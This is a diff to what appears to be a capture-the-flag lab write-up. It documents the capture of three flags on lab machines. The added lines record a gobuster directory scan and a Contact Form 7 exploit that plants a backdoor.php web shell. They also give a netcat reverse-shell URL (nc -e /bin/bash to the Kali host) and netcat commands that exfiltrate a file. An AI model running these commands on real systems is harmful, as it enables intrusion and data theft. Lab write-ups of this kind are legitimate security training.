@@ -62,5 +62,34 @@ fi
 ### Flags
 
 - `flag1.txt`: `a2c1f66d2b8051bd3a5874b5b6e43e21`
+  - **Exploit Used**
+    - Discovery of website directory listing.
+    - After running a `gobuster` scan, the directory listing was found for the target and the flag was found at `http://192.168.1.115/vendor/PATH`
+  - Commands run:
+    - `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://192.168.1.115`
+    - `http://192.168.1.115/vendor/PATH` (In Kali web browser.)
+
 - `flag2.txt`: `6a8ed560f0b5358ecf844108048eb337`
+  - **Exploit Used**
+    - Contact Form 7 vulnerability.
+    - The `exploit.sh` script was run and installed a `backdoor.php` file on the target WordPress server that allowed a shell session on the target and the flag was found in `/var/www/flag2.txt`.
+  - Commands run:
+    - `bash ./exploit.sh`
+    - `nc -lnvp 4444`
+    - `http://<Target 2 URL>/backdoor.php?cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash' (In Kali web browser.)
+    - `cd /var/www`
+    - `cat flag2.txt`
+
 - `flag3.png`: `a0f568aa9de277887f37730d71520d9b`
+  - **Exploit Used**
+    - Contact Form 7 vulnerability.
+    - The `exploit.sh` script was run and installed a `backdoor.php` file on the target WordPress server that allowed a shell session on the target and the flag was found in `/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png`.
+    - Netcat was used to exfiltrate the file to the attacking machine.
+  - Commands run:
+    - `bash ./exploit.sh`
+    - `nc -lnvp 4444`
+    - `http://<Target 2 URL>/backdoor.php?cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash' (In Kali web browser.)
+    - `find /var/www -type f -iname 'flag*'`
+    - `nc -l -p 4444 > flag3.png` (recieving)
+    - `cat flag3.png | netcat 192.168.1.90 4444` (sending)
+- ![flag3](./Images/Target2/flag3.JPG)
